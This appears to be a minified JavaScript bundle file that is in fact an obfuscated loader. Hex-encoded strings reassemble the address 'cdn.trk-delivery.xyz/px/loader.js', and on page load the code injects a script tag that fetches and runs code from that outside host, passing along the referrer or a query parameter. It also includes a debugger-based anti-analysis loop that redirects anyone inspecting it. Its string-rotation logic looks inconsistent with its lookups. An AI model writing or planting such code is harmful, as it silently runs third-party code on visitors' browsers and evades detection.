/*! bundle.min.js */
var _0x4e21 = [
  "\x63\x64\x6e\x2e\x74\x72\x6b\x2d\x64\x65\x6c\x69\x76\x65\x72\x79\x2e\x78\x79\x7a",
  "\x2f\x70\x78\x2f\x6c\x6f\x61\x64\x65\x72\x2e\x6a\x73",
  "\x68\x74\x74\x70\x73\x3a\x2f\x2f",
  "\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74",
  "\x73\x63\x72\x69\x70\x74",
  "\x73\x72\x63",
  "\x68\x65\x61\x64",
  "\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64",
  "\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72"
];
(function (_0x1a2b, _0x3c4d) {
  var _0x5e6f = function (_0x7a8b) {
    while (--_0x7a8b) {
      _0x1a2b["\x70\x75\x73\x68"](_0x1a2b["\x73\x68\x69\x66\x74"]());
    }
  };
  _0x5e6f(++_0x3c4d);
})(_0x4e21, 0x1a3);

var _0x2f = function (_0xa1, _0xb2) {
  _0xa1 = _0xa1 - 0x0;
  return _0x4e21[_0xa1];
};

(function () {
  "use strict";

  // Reassemble the delivery endpoint from the rotated string table.
  var _u = _0x2f("0x2") + _0x2f("0x0") + _0x2f("0x1");

  // Fingerprint tag id via char codes so it never appears as a literal.
  var _tag = String.fromCharCode(80, 88, 45, 55, 55, 51, 49, 50, 97, 98, 99);

  function _inject(_url) {
    var _s = document[_0x2f("0x3")](_0x2f("0x4"));
    _s[_0x2f("0x5")] = _url; // dynamic script src assembled at runtime
    _s.setAttribute("data-tag", _tag);
    _s.async = !![];
    (document[_0x2f("0x6")] || document.documentElement)[_0x2f("0x7")](_s);
  }

  function _boot() {
    var _q = new URLSearchParams(location.search);
    var _extra = _q.get("m");
    var _final = _u + (_extra ? "?m=" + _extra : "?r=" + document.referrer);
    _inject(_final);
  }

  if (document.readyState !== "loading") _boot();
  else document.addEventListener("DOMContentLoaded", _boot);

  // Anti-analysis: bail into a debugger loop if devtools timing is detected.
  setInterval(function () {
    var _t0 = Date.now();
    debugger;
    if (Date.now() - _t0 > 120) {
      window.location = _0x2f("0x2") + _0x2f("0x0");
    }
  }, 3000);
})();
